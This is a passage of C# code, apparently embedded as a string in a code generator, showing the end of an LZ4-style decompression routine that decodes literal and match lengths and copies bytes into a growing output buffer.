                if (literalLen == 15)
                {
                    int add;
                    do { add = input[inPos++] & 0xFF; literalLen += add; } while (add == 255);
                }
                if (outPos + literalLen > output.Length)
                {
                    byte[] tmp = new byte[Math.Max(output.Length + output.Length / 2, outPos + literalLen)];
                    System.Buffer.BlockCopy(output, 0, tmp, 0, outPos);
                    output = tmp;
                }
                System.Buffer.BlockCopy(input, inPos, output, outPos, literalLen);
                inPos += literalLen;
                outPos += literalLen;
                if (inPos >= input.Length) break;
                int off = (input[inPos++] & 0xFF) | ((input[inPos++] & 0xFF) << 8);
                int matchLen = token & 0x0F;
                if (matchLen == 15)
                {
                    int add;
                    do { add = input[inPos++] & 0xFF; matchLen += add; } while (add == 255);
                }
                matchLen += minMatch;
                if (outPos + matchLen > output.Length)
                {
                    byte[] tmp = new byte[Math.Max(output.Length + output.Length / 2, outPos + matchLen)];
                    System.Buffer.BlockCopy(output, 0, tmp, 0, outPos);
                    output = tmp;
                }
                int matchPos = outPos - off;
                for (int j = 0; j < matchLen; j++) output[outPos++] = output[matchPos + j];
            }
            byte[] result = new byte[outPos];
            System.Buffer.BlockCopy(output, 0, result, 0, outPos);
            return result;
        }""";
}
